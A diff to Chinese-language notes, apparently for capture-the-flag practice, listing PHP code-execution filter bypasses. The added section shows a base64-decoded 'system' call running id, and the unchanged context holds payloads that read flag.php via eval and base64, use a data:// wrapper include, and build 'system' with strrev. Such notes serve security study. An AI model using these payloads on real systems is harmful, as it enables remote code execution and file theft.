@@ -4,7 +4,7 @@
 2.      进行进一步加密绕过
         ?c=eval(base64_decode($_GET[x]));&x=Y3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
         eval($_GET['c'])
-        
+
 伪协议绕过：使用文件包含或其他能够使用伪协议的函数方法
         ?c=include(data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+)
 
@@ -41,3 +41,8 @@ php<8.0版本参数传多个值会一个个往后推,于是可以这样做:
 反转函数绕过:
         $a=strrev("metsys");反转字符串为system
         $a("type flag*");调用system函数执行
+
+函数编码调用绕过:
+        对过滤的代码用base64的形式赋值后调用
+        $f=base64_decode('c3lzdGVt');-->system('id')
+        $f('id');
